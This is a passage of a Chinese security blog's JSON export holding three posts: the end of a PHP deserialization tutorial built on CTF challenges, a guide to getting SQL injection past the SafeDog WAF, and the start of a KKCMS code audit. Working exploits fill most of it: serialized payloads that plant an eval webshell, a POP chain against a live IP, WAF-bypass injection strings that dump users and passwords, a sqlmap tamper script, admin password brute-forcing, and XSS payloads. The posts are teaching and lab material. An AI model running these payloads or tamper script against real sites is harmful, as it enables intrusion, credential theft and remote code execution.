  &#125;\n    public function login($u,$p)&#123;\n        return $this->username===$u&amp;&amp;$this->password===$p;\n    &#125;\n    public function __destruct()&#123;\n        $this->class->getInfo();\n    &#125;\n\n&#125;\n\nclass info&#123;\n    public $user='xxxxxx';\n    public function getInfo()&#123;\n        return $this->user;\n    &#125;\n&#125;\n\nclass backDoor&#123;\n    public $code;\n    public function getInfo()&#123;\n        eval($this->code);\n    &#125;\n&#125;\n\n$username=$_GET['username'];\n$password=$_GET['password'];\n\nif(isset($username) &amp;&amp; isset($password))&#123;\n    if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user']))&#123;\n        $user = unserialize($_COOKIE['user']);\n    &#125;\n    $user->login($username,$password);\n&#125;\n\n\n首先可以发现多了个这个正则\n/[oc]:\\d+:/i\n首先了解一下[]的含义\n[] 字符集合(字符域)。匹配所包含的任意一个字符。例如， '[abc]' 可以匹配 \"plain\" 中的 'a'。\n此时的话就可以看明白了，其含义就是过滤o:数字和c:数字,可以在:和数字中间加上个+号来使过滤失效，此时就类似于简单题的0X03，利用backdoor类进行构造即可代码如下\n&lt;?php\nclass ctfShowUser&#123;\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=false;\n    public $class = 'info';\n\n    public function __construct()&#123;\n        $this->class=new backDoor();\n    &#125;\n    public function login($u,$p)&#123;\n        return $this->username===$u&amp;&amp;$this->password===$p;\n    &#125;\n    public function __destruct()&#123;\n        $this->class->getInfo();\n    &#125;\n\n&#125;\n\nclass backDoor&#123;\n    public $code='eval($_POST[1]);';\n    public function getInfo()&#123;\n        eval($this->code);\n    &#125;\n&#125;\n\n$a=serialize(new ctfShowUser());\n$b=str_replace('O:','O:+',$a);\n$c=str_replace('C:','C:+',$b);\necho(urlencode($c));\n得到\nO%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D\n此时就可以进行rce了\n利用引用源代码\n&lt;?php\nerror_reporting(0);\ninclude('flag.php');\nhighlight_file(__FILE__);\nclass ctfshowAdmin&#123;\n    public $token;\n    public $password;\n\n    public function __construct($t,$p)&#123;\n        $this->token=$t;\n        $this->password = $p;\n    &#125;\n    public function login()&#123;\n        return $this->token===$this->password;\n    &#125;\n&#125;\n\n$ctfshow = unserialize($_GET['ctfshow']);\n$ctfshow->token=md5(mt_rand());\n\nif($ctfshow->login())&#123;\n    echo $flag;\n&#125;\n这里我们只需要保证token和password相同就可以得到flag，利用这个&amp;即可\n&lt;?php\nhighlight_file(__FILE__);\nclass ctfshowAdmin&#123;\n    public $token;\n    public $password;\n\n    public function __construct()&#123;\n        $this->token=&amp;$this->password;\n    &#125;\n    public function login()&#123;\n        return $this->token===$this->password;\n    &#125;\n&#125;\n$a=new ctfshowAdmin();\necho serialize($a);\n得到O:12:&quot;ctfshowAdmin&quot;:2:&#123;s:5:&quot;token&quot;;N;s:8:&quot;password&quot;;R:2;&#125;，赋值给参数ctfshow即可得到flag\nsession反序列化#check.php\nerror_reporting(0);\nrequire_once 'inc/inc.php';\n$GET = array(\"u\"=>$_GET['u'],\"pass\"=>$_GET['pass']);\n\n\nif($GET)&#123;\n\n\t$data= $db->get('admin',\n\t[\t'id',\n\t\t'UserName0'\n\t],[\n\t\t\"AND\"=>[\n\t\t\"UserName0[=]\"=>$GET['u'],\n\t\t\"PassWord1[=]\"=>$GET['pass'] //密码必须为128位大小写字母+数字+特殊符号，防止爆破\n\t\t]\n\t]);\n\tif($data['id'])&#123;\n\t\t//登陆成功取消次数累计\n\t\t$_SESSION['limit']= 0;\n\t\techo json_encode(array(\"success\",\"msg\"=>\"欢迎您\".$data['UserName0']));\n\t&#125;else&#123;\n\t\t//登陆失败累计次数加1\n\t\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);\n\t\techo json_encode(array(\"error\",\"msg\"=>\"登陆失败\"));\n\t&#125;\n&#125;\n\n\n#inc.php\nini_set('session.serialize_handler', 'php');\nclass User&#123;\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password)&#123;\n        $this->username = $username;\n        $this->password = $password;\n    &#125;\n    function setStatus($s)&#123;\n        $this->status=$s;\n    &#125;\n    function __destruct()&#123;\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    &#125;\n&#125;\n在inc.php中没有找到有关session注入的地方，不过这里我们知道了它是用php来读的，同时得到了一个类，同时呢我们会发现这个类在销毁的时候会进行一个 file_put_contents，username和password是可控的，这里我们就想到借此来写一个木马文件\n此时查看index.php\nif(isset($_SESSION['limit']))&#123;\n\t$_SESSION['limti']>5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n&#125;else&#123;\n\t setcookie(\"limit\",base64_encode('1'));\n\t $_SESSION['limit']= 1;\n&#125;\n这行里的是limti，它这里肯定一直是假的，所以执行的也就是$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;])，此时我们就可以通过控制cookie中的limit，来控制session，此时我们开始构造\n&lt;?php\n\n//ini_set('session.serialize_handler', 'php_serialize');\nsession_start();\nclass User&#123;\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password)&#123;\n        $this->username = $username;\n        $this->password = $password;\n    &#125;\n    function setStatus($s)&#123;\n        $this->status=$s;\n    &#125;\n    function __destruct()&#123;\n        file_put_contents(\"log-\".$this->username, \"使用\".$this->password.\"登陆\".($this->status?\"成功\":\"失败\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    &#125;\n&#125;\n\n$user=new User('1.php','&lt;?php @eval($_POST[1]);?>');\n$_SESSION['user']=$user;\n?>\n得到\nuser|O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"&lt;?php @eval($_POST[1]);?>\";s:6:\"status\";N;&#125;\n此时php读是怎么样的呢，我们再试一下，将上方代码中的注释取消即可得到\na:1:&#123;s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"&lt;?php @eval($_POST[1]);?>\";s:6:\"status\";N;&#125;&#125;\n发现两者不同点和之前所说类似，也就是多了个前者多了|，这里呢是php来读的，此时我们想要利用session反序列化的话，那么就需要用php来写，inc.php是php序列化来写的，而check.php包含了inc.php，因此也是php序列化来写的，此时我们就只能利用index.php来进行session反序列化了，只有它是用php来写的，此时我们构造我们的payload如下（将中间的内容都复制下来，粘贴到1.php后）\na:1:&#123;s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php|s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"&lt;?php @eval($_POST[1]);?>\";s:6:\"status\";N;&#125;\";s:8:\"password\";s:25:\"&lt;?php @eval($_POST[1]);?>\";s:6:\"status\";N;&#125;&#125;\n|后面的是值，我们先将|后面的拿出来看其是否能成功序列化\n$a='s:4:\"user\";O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"&lt;?php @eval($_POST[1]);?>\";s:6:\"status\";N;&#125;\";s:8:\"password\";s:25:\"&lt;?php @eval($_POST[1]);?>\";s:6:\"status\";N;&#125;';\nvar_dump(unserialize($a));\n那么此时我们的思路就有了，这个是序列化文本，当php来读时后面是会自动加载的，我们只需要将序列化得到的字符串前面加个|，也就可以达到session反序列化的目的，由于有base64解码，我们这里进行base64加密即可\n$a=|O:4:\"User\":3:&#123;s:8:\"username\";s:5:\"1.php\";s:8:\"password\";s:25:\"&lt;?php @eval($_POST[1]);?>\";s:6:\"status\";N;&#125;\necho base64_encode($a);\n得到\nfE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==\n此时赋值给cookie中的limit，而后再次访问index.php，此时看似是没有变化的，其实cookie已经改变，此时我们再访问一下check.php，让其进行反序列化，同时给参数u和pass赋值即可\nu=quan9i&amp;pass=quan9i\n\n\n此时访问log-1.php发现注入成功，我们传值即可获取flag\n1=system(\"tac flag.php\");\n\n\nPOP链构造这里以2022年ISCC的一道题来进行讲解\n&lt;?php\n\necho 'Happy New Year~ MAKE A WISH&lt;br>';\n\nif(isset($_GET['wish']))&#123;\n    @unserialize($_GET['wish']);\n&#125;\nelse&#123;\n    $a=new Road_is_Long;\n    highlight_file(__FILE__);\n&#125;\n/***************************pop your 2022*****************************/\n\nclass Road_is_Long&#123;\n    public $page;\n    public $string;\n    public function __construct($file='index.php')&#123;\n        $this->page = $file;\n    &#125;\n    public function __toString()&#123;\n        return $this->string->page;\n    &#125;\n\n    public function __wakeup()&#123;\n        if(preg_match(\"/file|ftp|http|https|gopher|dict|\\.\\./i\", $this->page)) &#123;\n            echo \"You can Not Enter 2022\";\n            $this->page = \"index.php\";\n        &#125;\n    &#125;\n&#125;\n\nclass Try_Work_Hard&#123;\n    protected  $var;\n    public function append($value)&#123;\n        include($value);\n    &#125;\n    public function __invoke()&#123;\n        $this->append($this->var);\n    &#125;\n&#125;\n\nclass Make_a_Change&#123;\n    public $effort;\n    public function __construct()&#123;\n        $this->effort = array();\n    &#125;\n\n    public function __get($key)&#123;\n        $function = $this->effort;\n        return $function();\n    &#125;\n&#125;\n/**********************Try to See flag.php*****************************/\n\n思路如下\n整体思路的话就是我们可以看见这个Try_Work_Hard类下append($value)方法是include变量的，\n我们对这个变量进行赋值就可以实现读取flag.php，然后这个方法需要用__invoke()来调用，\n而这个魔法方法是 当对象被当成函数来执行的时候调用，那么函数的话我们肯定就要找带括号的了，带括号的呢此时就找到了这个$function()，\n而这个是在 __get($key)魔术方法里的，__get()是当访问不可访问或不存在的属性时触发，意思我们调用它不存在的一个属性，就会触发，\n此时我们看 Road_is_Long类，它有这个__wakeup()类，这个是当反序列化成功的时候触发的，我们可以看见题里面检测wish变量，当值不是空的\n时候就会进行反序列化，此时就触发了这个wakeup类，它首先是进行了过滤，它把page里的进行了过滤，如果我们此时给page赋值为对象，那它就是把\n对象当成字符串来使用了，此时我们就会调用string这个魔法函数，这个函数里是调用这个string里的page变量，这时候我们的string也是个变量，那肯定\n调用不了page呀，但我们可以给它赋值为对象，我们给string传值为这个Make_a_Change类的对象，此时我们就可以调用page了，但是这个类里没有page\n这个时候就触发了__get魔术方法，这个方法是返回这个effort的值加上()，而这个类有一个构造方法__construc，它是给effort赋值的，我们此时给effort\n赋值为一个Try_Work_Hard类的对象，它不就返回了Try_Work_Hard()，此时到这个类里，由于它是一个对象，被当成函数使用了，此时就触发了__involve魔术\n方法，此时就append这个$var变量了，而append方法是包含这个$var变量的，此时我们用php:filter伪协议，就实现了读取文件\npop链构造如下\n&lt;?php\n\nclass Try_Work_Hard&#123;\n    protected  $var='php://filter/read=convert.base64-encode/resource=flag.php';\n    public function append($value)&#123;\n        include($value);\n    &#125;\n    public function __invoke()&#123;\n        $this->append($this->var);\n    &#125;\n&#125; \nclass Road_is_Long&#123;\n    public $page;\n    public $string;\n    public function __toString()&#123;\n        return $this->string->page;\n    &#125;\n\n    public function __wakeup()&#123;\n        if(preg_match(\"/file|ftp|http|https|gopher|dict|\\.\\./i\", $this->page)) &#123;\n            echo \"You can Not Enter 2022\";\n            $this->page = \"index.php\";\n        &#125;\n    &#125;\n&#125; \nclass Make_a_Change&#123;\n    public $effort;\n    public function __construct()&#123;\n        $this->effort = array();\n    &#125;\n\n    public function __get($key)&#123;\n        $function = $this->effort;\n        return $function();\n    &#125;\n&#125; \n$pop=new Road_is_Long();\n$pop->page=new Road_is_Long();\n$pop->page->string=new Make_a_Change();\n$pop->page->string->effort=new Try_Work_Hard();\necho urlencode(serialize($pop));\n?>\n而后得到\nO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D\n\n给参数赋值再经base64解码即可获取flag\nhttp://59.110.159.206:7050/?wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BN%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D\n\n参考文章反序列化之魔术方法的浅学习原理实践学习php反序列化和session反序列化[CTF]PHP反序列化总结CTF中反序列化一篇详解PHP反序列化实战经验丨PHP反序列化漏洞总结php序列化PHP-Session利用总结浅析PHP反序列化字符串逃逸\n","slug":"从零基础入门PHP反序列化","date":"2022-06-17T07:28:30.000Z","categories_index":"WEB知识","tags_index":"反序列化","author_index":"quan9i"},{"id":"c4af92d3966b8512b6eb5994e52b620f","title":"从SQL注入绕过最新安全狗WAF中学习fuzz","content":"声明文章首发于先知社区https://xz.aliyun.com/t/11412\n前言SQL注入并不是很精通，通过实战绕过WAF来进行加强SQL注入能力，希望对正在学习的师傅能有一丝帮助。\n安装安装前言我是本地搭建的环境进行测试的环境是windows11+phpstudy2018+sqli-labsphpstudy的安装我不再复述，这里简单说一下安全狗插件和安全狗的安装。\n过程在安装安全狗之前，一定要先做好安装apache2.4这一项，否则可能要浪费半个下午的时间来整(受害者本人自述了属于是)，因为在提前安装好这个后，再安装安全狗，就会出现如下图所示的情况，这时候就很容易进行配置了而如果你后安装apache2.4，出现Apache插件安装失败的可能性极大，那我们要怎么安装apache2.4呢，很简单，首先找到你apache下的bin路径，我的是&quot;D:\\phpStudy\\PHPTutorial\\Apache\\bin&quot;，然后进入cmd中(以管理员身份运行)\nC:\\Windows\\system32>d:\n\nD:\\>cd D:\\phpStudy\\PHPTutorial\\Apache\\bin\n\nD:\\phpStudy\\PHPTutorial\\Apache\\bin> httpd -k install -n apache2.4\n//安装插件\n此时插件的安装就完成了，直接去官网找Apache版本的安全狗下载到本地即可，此时进行安装(不要开启phpstudy)，此时选择好安装路径后就会出现配置界面，它安装过插件的话一般是会自动检测的此时直接点击确定就好了，然后打开就会发现插件是已安装的此时看安全狗这个网站安全狗与防护总开关是否都开启，只有都开启了才有效，此时再去打开phpstudy，一般他就应该是自己变成系统服务了，如果没变的话就再选择一下即可\n然后此时的话这个防护网站变成1个就说明配置好了去访问网站就可以发现安全狗生效了\n构造1=1方法一首先这里的话是尝试一个1=1，发现是不可以的更换成true=true进行尝试仍然不行，此时发现当and和后面没有空格的时候就会报错我们这里尝试用/**/来充当注释符发现还是被过滤了，此时我们就利用bp来进行fuzz，抓包后在/**/中添加变量（为爆破做准备）选择暴力破解，字符集就选/!*进行测试即可得到结果发现很多都可以充当空格来进行绕过，我们随意挑选一个进行尝试，构造payload如下\nid=1' and/*////*/1 --+\n\n成功绕过\n方法二当然常见的还有一个内联注释符，就是/*!00000*/这种的，用实例来解释是最好理解的\nmysql> select @@version;\n+-----------+\n| @@version |\n+-----------+\n| 5.5.53    |\n+-----------+\n1 row in set (0.00 sec)\n\nmysql> select /*!999991*/;\nERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1\n\nmysql> select /*!000001*/;\n+---+\n| 1 |\n+---+\n| 1 |\n+---+\n1 row in set (0.00 sec)\n\nmysql> select /*!1*/;\n+---+\n| 1 |\n+---+\n| 1 |\n+---+\n1 row in set (0.00 sec)\n\nmysql> select /*!505531*/;\n+---+\n| 1 |\n+---+\n| 1 |\n+---+\n1 row in set (0.00 sec)\n\nmysql> select /*!505541*/;\nERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1\n这种注释在mysql中叫做内联注释，如果没有接版本号时，会直接执行里面内容。当!后面接数据库版本号时，如果自身版本号(上述例子中的5.5.53)大于等于字符数(例如上述例子中的99999和00000)，就会将注释中的内容执行，否则就会当做注释来处理。那么这里的话，我们就想构造1=1，就可以利用它来进行绕过，我们构造如下/*!000001*/=/*!000001*/语句尝试进行绕过可以发现成功绕过了\norder by 绕过直接利用的话可以发现是不可以的由1=1的构造思路，我们尝试构造空格来进行绕过，构造payload如下\nid=1' order/*////*/by 3 --+\n\nid=1' order/*////*/by 4 --+\n成功判断出来了字段数为3\n联合查询首先的话是想利用内联注释来进行一个绕过，因为单独的一个union和单独的select都是可以的，此时我就想利用它内联注释字符数大于版本号时将其内语句作为注释来进行一个绕过，测试过程如下选择暴力破解，设置0-9依次进行爆破而后得到结果发现这种利用垃圾字符的内联注释方式无法再次绕过，此时我们去尝试进行其他方法，想到之前的fuzz/**/中间加东西可以绕过，不妨试一下这种，设置如下选择暴力破解，将字符集进行更换即可得到结果发现有很多可以绕过的，随便选一个来进行测试，构造payload如下\nid=-1' union/*/!*!**/select 1,2,3--+\n可以发现正常执行了，说明绕过了，这里再给出几个payload，师傅们可以自行测试\nid=-1' union/*//--**/select 1,2,3--+\nid=-1' union/*/!--**/select 1,2,3--+\nid=-1' union/*/-*!!*/select 1,2,3--+\n爆库方法一(/**/方法)此时直接去将3变成database()会被绕过，此时我是想用/*xxx*/()这种方式来进行绕过，利用bp设置如下而后如下设置暴力破解得到结果可以发现有很多方式，我们随便挑选一个进行测试\nid=-1' union/*/!*!**/select 1,2,database/*///-*/()--+\n成功绕过\n方法二(/*!*/内联注释法)我们设置payload为/*!()*/这种，利用bp在括号前面加上五个数字，依次来检验哪个可以进行绕过，具体设置如下而后选暴力破解，设置如下得到结果随机取出一个进行测试，构造payload如下\nid=-1' union/*/!*!**/select 1,2,database/*!20553()*/--+\n成功绕过\n爆表正常的话语句一般是这个样子\ngroup_concat(table_name) from information_schema.tables where table_schema=database()\n那么这里的话我们测试过后就会发现information_schema被过滤了，它俩只要在一起挨着就会被过滤同时呢，我们也发现利用from的时候也会被过滤对这两个进行分别fuzz的话比较麻烦，而且将两者进行一起用时可能会出现仍然被过滤的情况，因此此时的话就自然的想到了内联注释这种方法，可不可以用这种方法来进行绕过呢，我们先尝试一下\nfrom/*!information_schema.tables*/\n结果如下显然这种是不可行的，但是我们知道还有一种的话就是内联注释的利用方法就是中间加注释符再加换行，也就是/*!%23%0a*/这种形式，我们先进行本地测试\nmysql> select /*!#\n    -> 1*/;\n+---+\n| 1 |\n+---+\n| 1 |\n+---+\n1 row in set (0.00 sec)\nmysql> select /*!#/*\n    -> 1*/\n    -> ;\n+---+\n| 1 |\n+---+\n| 1 |\n+---+\n1 row in set (0.00 sec)\n此时经过本地测试发现，当运用内联注释时，里面插入/*，来构造/**/，也是可以实现绕过的，此时我们先试本地测试的第一种方法\n?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!%23%0ainformation_schema.tables*/ where table_schema='security'--+\n此时被绕过，那我们就用刚刚测试出来的第二种方法进行尝试\n?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!%23/*%0ainformation_schema.tables*/ where table_schema='security'--+\n此时想有没有可能是过滤了%23,我们将%23换成--+构造payload如下\n?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables*/ where table_schema='security'--+\n得到了全部表\n爆列有了表名的注入，那么注入列名也不是件太难的事情，修改一下语句即可，构造payload如下\n?id=-1' union/*/!*!**/select%201,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns*/ where table_name='users'--+\n爆字段信息同理，修改语句即可\n?id=-1' union/*/!*!**/select%201,2,group_concat(id,password)from/*!--+/*%0ausers*/--+\n其他姿势like[“%23”]在学习其他师傅的文章时，偶然间发现这个like[&quot;%23&quot;]，这个的话我们知道%23是注释符的含义，那么在这里的时候，它这个语句到底有什么作用呢，我们测试一下就知道了首先先正常查一个字段信息\nselect * from users where id=1 ;\n此时可以发现有一个结果，我们加上我们的like[&quot;%23&quot;]，构造payload如下\nselect * from users where id=1 like \"[%23]\";\n此时表变成空的了，那我们如果此时这样构造payload\nselect * from users where id=1 like \"[%23]\" union select * from users;\n我们知道前面users where id=1 like &quot;[%23]&quot;这个是空，那它这条语句就相当于\nselect * from users\n如下图所示\n那么此时我们就可以去我们的靶场进行测试，看是否能绕过\nid=-1' like \"[%23]\" /*!10440union select*/ 1,2,3 --+\n发现没有绕过，此时我们将union后的空格用换行符替代\nid=-1' like \"[%23]\" /*!10440union%0aselect*/ 1,2,3 --+\n此时就可以注入了，因此新的姿势就出现了，其他具体的不再列举，这里给出payload\n//爆库\nid=-1' like \"[%23]\" /*!10440union%0aselect*/ 1,2,database/*!--+/*%0a()*/ --+\n//爆表\nid=-1' like \"[%23]\" /*!10440union%0aselect*/ 1,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables */where table_schema='security'--+\n//爆列\nid=-1' like \"[%23]\" /*!10440union%0aselect*/ 1,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns */where table_name='users'--+\n//爆字段\nid=-1' like \"[%23]\" /*!10440union%0aselect*/ 1,2,group_concat(id,username,password)from/*!--+/*%0ausers*/--+              \ntamper脚本脚本如下\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\nAuthor:quan9i.top\n\"\"\"\n\nimport re #导入re模块\nimport os #导入os模块\n\nfrom lib.core.data import kb #导入sqlmap中lib\\core\\data中的kb函数,测试SQL注入的过程中,使用的配置文件事先全部被加载到了conf和kb\nfrom lib.core.enums import PRIORITY  #导入sqlmap中lib\\core\\enums中的PRIORITY函数，LOWEST = -100,LOWER = -50,LOW = -10,NORMAL = 0,HIGH = 10,HIGHER = 50,HIGHEST = 100\nfrom lib.core.common import singleTimeWarnMessage#输出到sqlmap控制台的函数\nfrom lib.core.enums import DBMS#一个数据库的枚举\n__priority__ = PRIORITY.LOW#定义优先级为LOW\n\ndef dependencies():\n    singleTimeWarnMessage(\"Bypass safedog by pureqh'%s' only %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))# singleTimeWarnMessage() 用于在控制台中打印出警告信息\ndef tamper(payload, **kwargs):\n\tpayload=payload.replace('AND','/*!10000AND*/')\n\tpayload=payload.replace('OR','/*!10000OR*/')\n\tpayload=payload.replace('ORDER BY','ORDER/*////*/BY')\n\tpayload=payload.replace('()','/*!20553()*/')\n\tpayload=payload.replace('UNION SELECT','UNION/*/!*!**/SELECT')\n\tpayload=payload.replace('information_schema.tables','/*!%23%0ainformation_schema.tables*/')\n\treturn payload\n\t\n示例如下\n//检测可注入类型\npython sqlmap.py -u http://127.0.0.1:81/sqli-labs-master/Less-1/?id=1 --tamper=dog \n破解数据库\npython sqlmap.py -u http://127.0.0.1:81/sqli-labs-master/Less-1/?id=1 --dbs --tamper=dog -v5\n\n参考文献https://xz.aliyun.com/t/10479#toc-0https://zhuanlan.zhihu.com/p/472880971https://www.cnblogs.com/Cl0ud/p/14394627.htmlhttps://cloud.tencent.com/developer/article/1856738https://blog.csdn.net/weixin_39190897/article/details/115841059https://blog.csdn.net/Drifter_Galaxy/article/details/108435339https://www.freebuf.com/articles/web/321240.htmlhttps://www.cnblogs.com/Cl0ud/p/14493204.htmlhttps://www.cnblogs.com/Cl0ud/p/14394627.html\n","slug":"从SQL注入绕过最新安全狗WAF中学习fuzz","date":"2022-06-08T09:35:30.000Z","categories_index":"绕WAF","tags_index":"SQL注入","author_index":"quan9i"},{"id":"2630421829e46cd019f16a83899a54d6","title":"记一次较为详细的某CMS代码审计","content":"声明文章首发于先知社区https://xz.aliyun.com/t/11714\n前言本次审计的话是Seay+昆仑镜进行漏洞扫描Seay的话它可以很方便的查看各个文件，而昆仑镜可以很快且扫出更多的漏洞点，将这两者进行结合起来，就可以发挥更好的效果。昆仑镜官方地址https://github.com/LoRexxar/Kunlun-M\n环境KKCMS环境搭建KKCMS链接如下https://github.com/liumengxiang/kkcms安装的话正常步骤就好，即\n1、解压至phpstudy目录下\n2、访问install\n3、新建kkcms数据库，然后在安装的时候用这个数据库\n4、安装完成，开始审计\n目录结构常见的目录结构，简单了解一下其作用\nadmin 后台管理目录\ncss CSS样式表目录\ndata 系统处理数据相关目录\ninstall 网页安装目录\nimages 系统图片存放目录\ntemplate 模板\nsystem  管理目录\n\n代码审计对扫描出的开始进行审计\n验证码重用admin/cms_login.php源码如下\n&lt;?php\nrequire_once('../system/inc.php');\nif(isset($_POST['submit']))&#123;\n    if ($_SESSION['verifycode'] != $_POST['verifycode']) &#123;\n        alert_href('验证码错误','cms_login.php');\n    &#125;\n    null_back($_POST['a_name'],'请输入用户名');\n    null_back($_POST['a_password'],'请输入密码');\n    null_back($_POST['verifycode'],'请输入验证码');\n    $a_name = $_POST['a_name'];\n    $a_password = $_POST['a_password'];\n    $sql = 'select * from xtcms_manager where m_name = \"'.$a_name.'\" and m_password = \"'.md5($a_password).'\"';\n    $result = mysql_query($sql);\n    if(!! $row = mysql_fetch_array($result))&#123;\n        setcookie('admin_name',$row['m_name']);\n        setcookie('admin_password',$row['m_password']);\n        header('location:cms_welcome.php');\n    &#125;else&#123;\n        alert_href('用户名或密码错误','cms_login.php');\n    &#125;\n&#125;\n?>\n验证码的校验代码\nif ($_SESSION['verifycode'] != $_POST['verifycode']) &#123;\n      alert_href('验证码错误','cms_login.php');\n  &#125;\n不难发现这里是将$_SESSION[&#39;verifycode&#39;]与POST上传的verifycode相比较,如果不相等就会刷新跳转，重新回到登录处，此时验证码也会被更新。我们进入前端界面看一下发现验证码js对应处存在文件，跟进查看一下\n&lt;?php\nsession_start();\n$image = imagecreate(50, 34);\n$bcolor = imagecolorallocate($image, 0, 0, 0);\n$fcolor = imagecolorallocate($image, 255, 255, 255);\n$str = '0123456789';\n$rand_str = '';\nfor ($i = 0; $i &lt; 4; $i++)&#123;\n\t$k = mt_rand(1, strlen($str));\n\t$rand_str .= $str[$k - 1];\n&#125;\n$_SESSION['verifycode'] = $rand_str;\nimagefill($image, 0, 0, $bcolor);\nimagestring($image, 7, 7, 10, $rand_str, $fcolor);\nheader('content-type:image/png');\nimagepng($image);\n?>\n该文件的含义是用0-9中的任意四个数字作为验证码，也就是说js引用该文件来产生验证码。这里学习过其他师傅的思路后，了解到\nBurpsuite默认不解析js\n因此我们这里就可以借助bp抓包，摒弃js，对用户名和密码进行爆破抓包后发送到instruct模块，在密码处添加变量而后添加一些常用的弱口令密码开始爆破成功爆破出密码\nXSSwap/shang.php使用昆仑镜进行扫描，得到结果结合Seay，查看该文件代码可以看到直接输出了$_GET[&#39;fee&#39;]，因此我们这里直接传入一个xss语句尝试触发xsspayload\nfee=&lt;script>alert(1)&lt;/script>\n\n\nwap/seacher.php昆仑镜扫描利用seay查看源码\n//这只是一部分，具体的师傅们可自行查看此文件\n&lt;?php include('../system/inc.php');\ninclude('../data/cxini.php');\n$link=$zwcx['zhanwai'];\n$q=$_POST['wd'];\n\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head lang=\"en\">\n&lt;?php  include 'head.php';?>\n&lt;title>搜索&lt;?php echo $q?>-&lt;?php echo $xtcms_seoname;?>&lt;/title>\n&lt;meta name=\"keywords\" content=\"&lt;?php echo $q?>,&lt;?php echo $xtcms_keywords;?>\">\n&lt;meta name=\"description\" content=\"&lt;?php echo $xtcms_description;?>\">\n可以发现这里这个变量$q直接被输出了，这个$q是POST上传的wd参数，因此我们这里POST上传wd参数，给它赋值一个xss语句的话，应该是可以进行XSS的，我们试着去构造一下\nwp=&lt;script>alert(1)&lt;/script>\n\n成功触发XSS\nwap/movie.php//部分源码\n&lt;?php include('../system/inc.php');\ninclude '../system/list.php';\n$page=$_GET['page'];?>\n&lt;!DOCTYPE html>\n&lt;html>\n$b=(strpos($_GET['m'],'rank='));\n$ye=substr($_GET['m'],$b+5);\n?>\n&lt;a &lt;?php if ($ye==\"rankhot\")&#123;echo 'class=\"on\"';&#125;elseif($ye==\"createtime\" or $ye==\"rankpoint\")&#123;&#125;else&#123; echo 'class=\"on\"';&#125;;?> href=\"?m=/dianying/list.php?rank=rankhot\">最近热映&lt;/a> \n&lt;a  &lt;?php if ($ye==\"createtime\")&#123;echo 'class=\"on\"';&#125;else&#123;&#125;;?> href=\"?m=/dianying/list.php?rank=createtime\">最新上映&lt;/a>        \n&lt;a  &lt;?php if ($ye==\"rankpoint\")&#123;echo 'class=\"on\"';&#125;else&#123;&#125;;?> href=\"?m=/dianying/list.php?rank=rankpoint\">最受好评&lt;/a>\n&lt;/div>\n&lt;?php echo 